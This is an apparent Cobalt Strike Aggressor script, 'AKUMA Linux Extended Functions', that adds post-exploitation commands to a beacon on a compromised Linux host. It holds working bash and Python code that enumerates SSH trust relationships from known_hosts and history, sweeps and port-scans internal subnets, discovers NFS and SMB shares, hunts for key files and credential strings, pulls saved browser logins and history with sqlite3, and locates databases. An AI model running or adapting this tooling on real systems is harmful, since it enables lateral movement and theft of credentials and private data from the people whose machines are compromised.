# AKUMA's Linux Extended Functions
# –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è lateral movement –∏ data collection

# ========== LATERAL MOVEMENT FUNCTIONS ==========

sub akuma_trust_enum {
    local('$bid');
    $bid = $1;
    
    blog($bid, "üîç AKUMA Trust Relationship Enumeration Starting...");
    
    $trust_script = "#!/bin/bash
echo 'üîç AKUMA TRUST RELATIONSHIP ANALYSIS'
echo '=================================='

echo '=== SSH CONNECTIONS ==='
ss -anp 2>/dev/null | grep :22 | grep ESTABLISHED
netstat -anp 2>/dev/null | grep :22 | grep ESTABLISHED

echo '=== KNOWN HOSTS ==='
cat ~/.ssh/known_hosts 2>/dev/null | awk '{print $1}' | sort -u
find /home -name 'known_hosts' 2>/dev/null | xargs cat 2>/dev/null | awk '{print $1}' | sort -u

echo '=== RECENT CONNECTIONS ==='
last -i | head -20
lastlog 2>/dev/null | head -10

echo '=== SSH CONFIG ==='
cat ~/.ssh/config 2>/dev/null
find /home -name 'config' -path '*/.ssh/*' 2>/dev/null | xargs cat 2>/dev/null

echo '=== SUDO USAGE ==='
grep -r 'sudo' ~/.bash_history 2>/dev/null | tail -10
grep -r 'su ' ~/.bash_history 2>/dev/null | tail -10

echo '‚úÖ Trust enumeration complete!'
";

    bshell($bid, $trust_script);
    
    blog($bid, "‚úÖ AKUMA Trust Enumeration Complete!");
}

sub akuma_internal_scan {
    local('$bid');
    $bid = $1;
    
    blog($bid, "üåê AKUMA Internal Network Scan Starting...");
    
    # Advanced Python scanner
    $internal_scanner = "#!/usr/bin/env python3
import os
import socket
import threading
import ipaddress
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

def ping_sweep(network):
    alive_hosts = []
    
    def ping_host(ip):
        try:
            result = subprocess.run(['ping', '-c', '1', '-W', '1', str(ip)], 
                                  capture_output=True, text=True, timeout=2)
            return str(ip) if result.returncode == 0 else None
        except:
            return None
    
    print(f'Scanning network: {network}')
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(ping_host, ip) for ip in network.hosts()]
        for future in as_completed(futures):
            result = future.result()
            if result:
                alive_hosts.append(result)
    
    return alive_hosts

def port_scan(host, ports):
    open_ports = []
    
    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((host, port))
            sock.close()
            return port if result == 0 else None
        except:
            return None
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(scan_port, port) for port in ports]
        for future in as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)
    
    return sorted(open_ports)

def main():
    print('üåê AKUMA Internal Network Scanner')
    print('=' * 50)
    
    # Get network interfaces and routes
    routes_output = os.popen(\"ip route | grep -E '^[0-9]' | awk '{print $1}' | grep '/'\").read()
    networks = [line.strip() for line in routes_output.split('\\n') if line.strip()]
    
    common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 
                   1433, 1521, 3306, 3389, 5432, 5985, 5986, 8080, 8443, 9100]
    
    for network_str in networks:
        if '.' in network_str and '/' in network_str:
            try:
                network = ipaddress.ip_network(network_str, strict=False)
                if network.num_addresses <= 1024:  # Only scan reasonable sized networks
                    alive_hosts = ping_sweep(network)
                    print(f'Alive hosts in {network}: {len(alive_hosts)}')
                    
                    for host in alive_hosts[:10]:  # Limit to 10 hosts
                        print(f'Scanning {host}...')
                        open_ports = port_scan(host, common_ports)
                        if open_ports:
                            print(f'{host}: {open_ports}')
                        else:
                            print(f'{host}: No common ports open')
            except Exception as e:
                print(f'Error scanning {network_str}: {e}')

if __name__ == '__main__':
    main()
";

    bshell($bid, "python3 -c \"" . $internal_scanner . "\"");
    
    blog($bid, "‚úÖ AKUMA Internal Scan Complete!");
}

sub akuma_share_discovery {
    local('$bid');
    $bid = $1;
    
    blog($bid, "üìã AKUMA Share Discovery Starting...");
    
    $share_script = "#!/bin/bash
echo 'üìã AKUMA NETWORK SHARES DISCOVERY'
echo '================================'

echo '=== NFS SHARES ==='
showmount -e 2>/dev/null
showmount -e localhost 2>/dev/null
cat /etc/exports 2>/dev/null
mount | grep nfs

echo '=== SMB/CIFS SHARES ==='
smbclient -L //localhost -N 2>/dev/null
smbclient -L //127.0.0.1 -N 2>/dev/null
mount | grep cifs
cat /etc/samba/smb.conf 2>/dev/null | grep -v '^#' | grep -v '^$'

echo '=== CURRENT MOUNTS ==='
mount | grep -E 'nfs|cifs|sshfs|ftp'
cat /etc/fstab | grep -E 'nfs|cifs|sshfs|ftp'

echo '=== NETWORK FILESYSTEM SERVICES ==='
ps aux | grep -E 'nfsd|smbd|nmbd|rpcbind' | grep -v grep

echo '‚úÖ Share discovery complete!'
";

    bshell($bid, $share_script);
    
    blog($bid, "‚úÖ AKUMA Share Discovery Complete!");
}

# ========== DATA COLLECTION FUNCTIONS ==========

sub akuma_file_hunt {
    local('$bid');
    $bid = $1;
    
    blog($bid, "üóÇÔ∏è AKUMA Sensitive File Hunt Starting...");
    
    $file_hunter = "#!/usr/bin/env python3
import os
import hashlib
import time
from pathlib import Path

def hunt_sensitive_files():
    print('üóÇÔ∏è AKUMA Sensitive File Hunter')
    print('=' * 40)
    
    # Define search patterns
    sensitive_patterns = {
        'Documents': ['*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx'],
        'Text Files': ['*.txt', '*.rtf', '*.odt'],
        'Archives': ['*.zip', '*.rar', '*.tar', '*.gz', '*.7z'],
        'Database': ['*.sql', '*.db', '*.sqlite', '*.sqlite3', '*.mdb'],
        'Config': ['*.conf', '*.config', '*.ini', '*.json', '*.xml'],
        'Keys': ['*.pem', '*.key', '*.crt', '*.p12', '*.pfx'],
        'Source Code': ['*.py', '*.php', '*.js', '*.java', '*.cpp', '*.c']
    }
    
    search_dirs = ['/home', '/var/www', '/opt', '/etc', '/usr/local']
    max_size = 10 * 1024 * 1024  # 10MB limit
    
    for category, patterns in sensitive_patterns.items():
        print(f'\\n=== {category.upper()} ===')
        found_files = []
        
        for search_dir in search_dirs:
            if os.path.exists(search_dir):
                for pattern in patterns:
                    try:
                        for file_path in Path(search_dir).rglob(pattern):
                            if file_path.is_file():
                                try:
                                    stat = file_path.stat()
                                    if stat.st_size <= max_size:
                                        found_files.append({
                                            'path': str(file_path),
                                            'size': stat.st_size,
                                            'modified': time.ctime(stat.st_mtime)
                                        })
                                except:
                                    continue
                    except:
                        continue
        
        # Sort by size (largest first) and limit results
        found_files.sort(key=lambda x: x['size'], reverse=True)
        for file_info in found_files[:20]:  # Limit to 20 files per category
            print(f\"{file_info['path']} ({file_info['size']} bytes, {file_info['modified']})\")

def hunt_credentials_in_files():
    print('\\nüîê CREDENTIAL PATTERNS IN FILES')
    print('=' * 40)
    
    cred_patterns = ['password', 'passwd', 'pwd', 'secret', 'key', 'token', 'api_key']
    search_dirs = ['/home', '/var/www', '/opt']
    
    for search_dir in search_dirs:
        if os.path.exists(search_dir):
            for root, dirs, files in os.walk(search_dir):
                for file in files:
                    if any(file.endswith(ext) for ext in ['.txt', '.conf', '.config', '.ini', '.php', '.py', '.js']):
                        file_path = os.path.join(root, file)
                        try:
                            if os.path.getsize(file_path) < 1024 * 1024:  # < 1MB
                                with open(file_path, 'r', errors='ignore') as f:
                                    content = f.read()
                                    for pattern in cred_patterns:
                                        if pattern in content.lower():
                                            print(f'{file_path}: Contains \"{pattern}\"')
                                            break
                        except:
                            continue

if __name__ == '__main__':
    hunt_sensitive_files()
    hunt_credentials_in_files()
";

    bshell($bid, "python3 -c \"" . $file_hunter . "\"");
    
    blog($bid, "‚úÖ AKUMA File Hunt Complete!");
}

sub akuma_browser_extract {
    local('$bid');
    $bid = $1;
    
    blog($bid, "üåê AKUMA Browser Data Extraction Starting...");
    
    $browser_script = "#!/bin/bash
echo 'üåê AKUMA BROWSER DATA EXTRACTION'
echo '==============================='

echo '=== CHROME/CHROMIUM DATA ==='
find /home -name 'Login Data' -o -name 'Cookies' -o -name 'Web Data' -o -name 'History' 2>/dev/null | head -10
find /home -path '*/.config/google-chrome/Default/*' -name '*.db' 2>/dev/null | head -10
find /home -path '*/.config/chromium/Default/*' -name '*.db' 2>/dev/null | head -10

echo '=== FIREFOX DATA ==='
find /home -name 'logins.json' -o -name 'cookies.sqlite' -o -name 'places.sqlite' 2>/dev/null | head -10
find /home -path '*/.mozilla/firefox/*' -name '*.sqlite' 2>/dev/null | head -10

echo '=== BROWSER PROFILES ==='
ls -la /home/*/.config/google-chrome/ 2>/dev/null
ls -la /home/*/.mozilla/firefox/ 2>/dev/null

echo '=== SAVED PASSWORDS (if accessible) ==='
# Chrome passwords (usually encrypted)
find /home -name 'Login Data' 2>/dev/null | while read file; do
    echo \"Found Chrome login data: \$file\"
    sqlite3 \"\$file\" \"SELECT origin_url, username_value FROM logins LIMIT 10\" 2>/dev/null || echo \"Encrypted or inaccessible\"
done

echo '=== BROWSER HISTORY ==='
find /home -name 'History' 2>/dev/null | while read file; do
    echo \"Chrome History: \$file\"
    sqlite3 \"\$file\" \"SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 20\" 2>/dev/null || echo \"Inaccessible\"
done

find /home -name 'places.sqlite' 2>/dev/null | while read file; do
    echo \"Firefox History: \$file\"
    sqlite3 \"\$file\" \"SELECT url, title, visit_count FROM moz_places ORDER BY visit_count DESC LIMIT 20\" 2>/dev/null || echo \"Inaccessible\"
done

echo '‚úÖ Browser extraction complete!'
";

    bshell($bid, $browser_script);
    
    blog($bid, "‚úÖ AKUMA Browser Extraction Complete!");
}

sub akuma_database_discovery {
    local('$bid');
    $bid = $1;
    
    blog($bid, "üíΩ AKUMA Database Discovery Starting...");
    
    $db_script = "#!/bin/bash
echo 'üíΩ AKUMA DATABASE DISCOVERY'
echo '=========================='

echo '=== RUNNING DATABASE SERVICES ==='
ps aux | grep -E '(mysql|postgres|mongo|redis|sqlite)' | grep -v grep

echo '=== DATABASE PORTS ==='
ss -tlnp 2>/dev/null | grep -E ':(3306|5432|27017|6379|1433|1521)'
netstat -tlnp 2>/dev/null | grep -E ':(3306|5432|27017|6379|1433|1521)'

echo '=== MYSQL ==='
find /etc /var /opt -name 'my.cnf' 2>/dev/null
ls -la /var/lib/mysql 2>/dev/null
cat /etc/mysql/my.cnf 2>/dev/null | grep -v '^#'

echo '=== POSTGRESQL ==='
find /etc -name 'postgresql.conf' 2>/dev/null
find /etc -name 'pg_hba.conf' 2>/dev/null
ls -la /var/lib/postgresql 2>/dev/null

echo '=== MONGODB ==='
cat /etc/mongod.conf 2>/dev/null | grep -v '^#'
ls -la /var/lib/mongodb 2>/dev/null

echo '=== REDIS ==='
cat /etc/redis/redis.conf 2>/dev/null | grep -v '^#' | head -20
ls -la /var/lib/redis 2>/dev/null

echo '=== SQLITE DATABASES ==='
find /home /var /opt -name '*.db' -o -name '*.sqlite*' 2>/dev/null | head -30

echo '=== DATABASE CONFIGURATION FILES ==='
find /home /var /opt -name '*database*' -o -name '*db.conf*' 2>/dev/null | head -20

echo '‚úÖ Database discovery complete!'
";

    bshell($bid, $db_script);
    
    blog($bid, "‚úÖ AKUMA Database Discovery Complete!");
}

# –°–æ–æ–±—â–µ–Ω–∏–µ –æ –∑–∞–≥—Ä—É–∑–∫–µ —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π
println("üî• AKUMA Linux Extended Functions Loaded!");
println("   Additional lateral movement and data collection capabilities");
println("   üéØ Trust enum, Internal scanning, Share discovery");
println("   üíæ File hunting, Browser extraction, Database discovery");
